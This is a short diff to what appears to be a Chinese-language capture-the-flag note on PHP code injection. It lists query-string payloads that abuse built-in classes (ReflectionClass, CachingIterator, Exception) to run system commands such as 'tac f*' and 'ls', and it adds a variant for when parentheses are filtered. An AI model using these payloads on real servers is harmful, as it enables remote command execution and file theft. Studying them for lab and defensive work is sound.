@@ -13,3 +13,7 @@ v1=ReflectionClass&v2=system('tac f*')
 v1=CachingIterator&v2=system(ls)
 v1=Exception&v2=system(ls)
 ```
+如果有过滤不能使用()
+```
+v1=Directorylnterator&v2=phpinfo
+```
